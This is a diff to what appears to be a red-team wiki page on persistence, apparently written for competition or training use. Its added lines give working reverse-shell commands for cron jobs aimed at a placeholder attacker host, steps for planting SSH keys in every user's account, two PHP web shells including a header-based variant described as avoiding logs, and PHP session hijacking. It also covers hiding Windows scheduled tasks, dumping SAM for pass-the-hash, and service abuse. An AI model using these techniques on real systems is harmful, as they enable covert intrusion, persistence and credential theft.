@@ -5,29 +5,78 @@ The C2 implant of choice for CU at the time of writing is [[Sliver C2]]. You can
 
 [[MSFVenom]] also contains functionality for binding malware to legitimate executables. However, this must be done in conjunction with [[Evasion]] as all MSFVenom payloads and TTPs are well signatured. 
 
-## Persistence via LOL
-- Linux
-	- Cron jobs
-	- Install and enable new service
-	- Malicious user acct or ssh keys
-- Windows
-	- Registry Run Keys
-	- Scheduled Tasks
-		- Can delete attribute SD from task at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Tree\\\<TASK\> to hide the running task from `schtasks`.
-	- Startup Folder
-	- Malicious user acct
-		- Administrator User
-			- If NOT:
-				- Backup Operators && Remote Management Users member can export HKLM\\system and HKLM\\sam to PTH with [[Evil-WinRM]]. This can also be accomplished by editing config.inf with [[secedit]] directly and adding the user to privileged groups and assigning privileges to the user directly via the GUI. This prevents the new groups from appearing in a user summary. TODO: Finish this with more details
-	- DLL Hijacking
-	- Poisoning Shortcuts
-	- Backdoor Applications
-		- [[MSFVenom]] has functionality for this.
-	- Replace Default Applications for File types
-		- HKEY_CLASSES_ROOT???
-	- Malicious Services
-		- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].
+## Persistence via LOL (Living off the Land)
+#### Linux
+- Install and enable new service
+- Malicious user acct
+###### Cron jobs: 
+- Put a reverse shell in a cron job. This is the classic reverse shell string: 
+  `/bin/bash -i > /dev/tcp/<attacker-IP>/<port> 0<&1 2>&1`
+- If the victim machine has the traditional version of netcat installed, then this would work as well: `nc -e /bin/bash <ATTACKER_IP> <PORT>`
+These are all the places you can hide cron jobs:
+- `/var/spool/cron/crontabs/` — per-user cron jobs
+- `/etc/crontab` — system crontab file, this will have references to all the other system crontab files below
+- `/etc/cron.d/`
+- `/etc/cron.hourly/`
+- `/etc/cron.daily/`
+- `/etc/cron.weekly/`
+- `/etc/cron.monthly/`
+###### SSH Keys:
+- If you don't have an SSH key, generate one with `ssh-keygen`. 
+- Add your public key to the `~/.ssh/authorized_keys` file in every user's directory. Create the file if it isn't already present, then add a new line in the file and put your public key there.
+- Set the permissions on the file and directory by running `chmod 700 ~/.ssh` and 
+  `chmod 600 ~/.ssh/authorized_keys`
 
+
+#### Windows
+- Registry Run Keys
+- Scheduled Tasks
+	- Can delete attribute SD from task at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\Tree\\\<TASK\> to hide the running task from `schtasks`.
+- Startup Folder
+- Malicious user acct
+	- Administrator User
+		- If NOT:
+			- Backup Operators && Remote Management Users member can export HKLM\\system and HKLM\\sam to PTH with [[Evil-WinRM]]. This can also be accomplished by editing config.inf with [[secedit]] directly and adding the user to privileged groups and assigning privileges to the user directly via the GUI. This prevents the new groups from appearing in a user summary. TODO: Finish this with more details
+- DLL Hijacking
+- Poisoning Shortcuts
+- Backdoor Applications
+	- [[MSFVenom]] has functionality for this.
+- Replace Default Applications for File types
+	- HKEY_CLASSES_ROOT???
+- Malicious Services
+	- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].
+
+
+#### PHP (Web Servers)
+###### PHP Command Parameter
+If you find a web server that uses PHP, put this code snippet somewhere in the PHP page. Then, you'll be able to send commands to the website via GET and POST requests.
+```php
+<?php  
+if (isset($_REQUEST['cmd'])) {  
+echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";  
+}  
+?>
+```
+Command execution example: `http://example.com/webscript.php?cmd=ls` (this uses a GET request, which is less stealthy than using a POST request.)
+
+Alternatively, you could use the following code to achieve the same effect, but using HTTP headers instead. (This option is stealthier than GET or POST requests.)
+``` PHP
+<?php  
+if (isset($_SERVER['HTTP_CMD'])) {  
+echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";  
+}  
+?>
+```
+Command execution example: `curl -H "CMD: ls" http://example.com/webscript.php`
+- This method sends the commands via a custom HTTP header. HTTP headers often aren't displayed in logs, so it's quite stealthy. 
+###### Stealing PHP Sessions
+- This is basically session hijacking, but with PHP. 
+- Some web servers write their session IDs to disk. When a web server does that, you can go find the file that contains the session IDs and use them to log in as an authorized user. 
+- These might not be good for long-term persistence since sessions expire, but it's worth noting nonetheless. 
+- PHP web servers sometimes store their session IDs in `var/lib/php/sessions`. The session file naming format is `sess_<SESSION_ID>`. 
+- To conduct this attack, steal a session ID and change your `PHPSESSID` cookie to it (in "inspect element" or a similar browser tool) to hijack the session and login as an authorized user.
+>[!tip] Troubleshooting Tip
+>If you can't find the session IDs in `var/lib/php/sessions`, they could still be on disk somewhere. PHP has a configuration text file called `php.ini` that's generally located in `/etc/php.ini` or `/usr/local/lib/php.ini`, so check the `php.ini` config file to see if the session IDs are stored elsewhere.
 ## Domain Persistence
 ### Credentials
 You can acquire hashes of users using [[Mimikatz]]'s DCSync functionality for every user. This will grant access to the krbtgt account for golden tickets, etc. 
